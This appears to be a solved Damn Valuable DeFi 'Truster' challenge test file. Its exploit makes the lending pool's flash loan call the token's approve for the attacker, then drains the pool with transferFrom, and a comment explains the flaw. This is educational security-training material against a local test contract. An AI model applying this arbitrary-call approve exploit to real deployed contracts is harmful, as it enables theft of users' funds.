const { ethers } = require('hardhat');
const { expect } = require('chai');
const { Interface } = require('ethers/lib/utils');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        /**
         * EXPLOIT:
         * Flash loan has a function call that accepts any contract as target,
         * and any payload as data;
         * as such the data can be an `approve` call to the token contract,
         * which will execute in the context that the pool is the msg.sender.
         * 
         * A flash loan of 0 value is first taken out, whilst the `approve` call is made 
         * that specifies the attacker as the spender,
         * as such the flash loan tx completes without issue.
         * 
         * Then the attacker can call `tranferFrom` to withdraw all funds specified in the `approve`.
         */


        const abi = ["function approve(address spender, uint256 amount) returns (bool)"]
        const iface = new Interface(abi)
        const data = iface.encodeFunctionData("approve", [
            attacker.address,
            await this.token.balanceOf(this.pool.address)
        ])

        await this.pool.connect(attacker).flashLoan(
            0,
            attacker.address,
            this.token.address,
            data
        )

        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, await this.token.balanceOf(this.pool.address))
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

